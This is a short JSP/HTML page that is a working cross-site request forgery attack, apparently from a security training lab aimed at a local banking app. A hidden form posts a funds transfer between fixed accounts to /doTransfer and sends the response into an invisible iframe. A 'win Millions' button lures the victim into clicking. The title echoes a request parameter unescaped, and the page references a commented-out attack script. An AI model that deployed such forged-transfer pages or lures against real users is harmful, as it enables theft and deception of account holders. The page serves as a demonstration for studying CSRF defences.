<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello ${param.name}, now you can get rich!</title>
    <%--<script src="/js/attack.js"></script>--%>
</head>
<body>
    <h2 class="hello-title">Hello ${param.name}!</h2>
    <form action="http://localhost:8080/doTransfer" method="post" target="hiddenFrame"
          id="csrfTransferForm">
        <input name="fromAccount" type="hidden" value="1-987654-1">
        <input name="toAccount" type="hidden" value="2-542397-2">
        <input name="amount" type="hidden" value="11">
        <input name="currency" type="hidden" value="CHF">
        <input name="note" type="hidden" value="hello CSRF">
        <input type="submit" value="CLICK HERE and win Millions $$$!" />
    </form>
    <iframe name="hiddenFrame" style="display: none;"></iframe>
</body>
</html>